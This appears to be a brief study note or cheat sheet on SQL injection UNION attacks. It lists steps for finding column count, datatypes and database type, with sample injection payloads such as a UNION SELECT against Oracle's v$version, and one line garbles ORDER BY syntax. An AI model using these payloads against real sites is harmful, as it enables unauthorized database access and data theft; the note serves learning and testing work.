SQLi Union Attacks

SQL Injection UNION Attack

1. Determine the number of columns in the table
    i.  'UNION select NULL, NULL etc.keep adding NULL until you get 200 response code.
    ii. 'UNION select ORDER BY 1, 2 etc.
2. Determine the datatype of the columns
3. Find the database type
   'UNION  	SELECT banner, NULL FROM v$version--

